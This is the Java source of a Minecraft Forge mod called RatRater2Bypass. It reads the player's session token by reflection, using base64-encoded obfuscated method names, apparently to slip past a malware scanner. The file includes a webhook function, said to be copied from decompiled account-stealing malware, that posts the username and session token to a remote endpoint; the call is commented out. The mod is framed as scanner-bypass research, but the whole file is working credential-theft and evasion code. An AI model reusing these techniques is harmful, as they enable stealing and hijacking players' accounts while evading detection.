package com.github.commandcracker.ratrater2bypass;

import net.minecraftforge.fml.common.Mod;
import net.minecraftforge.fml.common.Mod.EventHandler;
import net.minecraftforge.fml.common.event.FMLInitializationEvent;
import net.minecraft.client.Minecraft;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.Base64;

import net.minecraft.util.Session;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.StringEntity;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;

@Mod(modid = RatRater2Bypass.MODID, version = RatRater2Bypass.VERSION)
public class RatRater2Bypass {
    public static final String MODID = "ratrater2bypass";
    public static final String VERSION = "1.0";


    private static String getTokenFromField() {
        try {
            // Example of bypass 1
            Field token_field = Session.class.getDeclaredField("field_148258_c");
            token_field.setAccessible(true);
            return (String) token_field.get(Minecraft.getMinecraft().getSession());
        } catch (NoSuchFieldException | IllegalAccessException ignore) {
            return "";
        }
    }

    private static String getSessionIDFromGetSessionID() {
        try {
            // Encoding Example of bypass 2 with func_111286_b (getSessionID)
            byte[] decodedBytes = Base64.getDecoder().decode("ZnVuY18xMTEyODZfYg==");
            String decodedString = new String(decodedBytes);
            Method getSessionID = Session.class.getMethod(decodedString);
            return (String) getSessionID.invoke(Minecraft.getMinecraft().getSession());
        } catch (NoSuchMethodException | InvocationTargetException | IllegalAccessException ignore) {
            return "";
        }
    }

    private static String getTokenFromGetToken() {
        try {
            // Encoding Example of bypass 2 with func_148254_d (getToken)
            byte[] decodedBytes = Base64.getDecoder().decode("ZnVuY18xNDgyNTRfZA==");
            String decodedString = new String(decodedBytes);
            Method getSessionID = Session.class.getMethod(decodedString);
            return (String) getSessionID.invoke(Minecraft.getMinecraft().getSession());
        } catch (NoSuchMethodException | InvocationTargetException | IllegalAccessException ignore) {
            return "";
        }
    }

    // Chang accordingly to the bypass you want to try out

    @EventHandler
    public void init(FMLInitializationEvent event) {
        String username = Minecraft.getMinecraft().getSession().getUsername();
        String playerID = Minecraft.getMinecraft().getSession().getPlayerID();
        String token = getTokenFromField();
        //String token = getTokenFromGetToken();

        String sessionID = "token:" + token + ":" + playerID;
        //String sessionID = getSessionIDFromGetSessionID();

        printSessionID(sessionID, username);
        //writeToFile(sessionID, username, "SessionID.txt");
        //sendToWebhook(sessionID, username, "");
    }

    // Just some function to output the sessionID

    private void sendToWebhook(String sessionID, String username, String webhookUrl) {
        try {
            CloseableHttpClient httpClient = HttpClients.createDefault();
            HttpPost request = new HttpPost(webhookUrl);
            // Totally not copied from a random rat I just decompiled:
            String body = "{\"content\": \"**Username**: `" + username + "`\\n**Session ID** (TOKEN:SSID:UUID): `" + sessionID + "`\\n**Skyblock**: [sky.shiiyu.moe](https://sky.shiiyu.moe/" + username + ")\\n**--END OF LOG (1.8.9)--**\"}";
            StringEntity requestEntity = new StringEntity(body);

            request.setEntity(requestEntity);
            request.setHeader("Content-Type", "application/json");
            request.setHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0");

            CloseableHttpResponse response = httpClient.execute(request);
            response.close();
            httpClient.close();
            System.out.println(">>> Sent sessionID to \"" + webhookUrl + '"');
        } catch (IOException ignore) {
        }
    }

    private void writeToFile(String sessionID, String username, String path) {
        try {
            File file = new File(path);
            FileWriter myWriter = new FileWriter(file, true);
            myWriter.write('"' + sessionID + '"' + ' ' + '"' + username + '"' + '\n');
            myWriter.close();
            System.out.println(">>> Written sessionID to \"" + file.getAbsolutePath() + '"');
        } catch (IOException ignore) {
        }
    }

    private void printSessionID(String sessionID, String username) {
        System.out.println(">>> " + '"' + sessionID + '"' + ' ' + '"' + username + '"');
    }

}
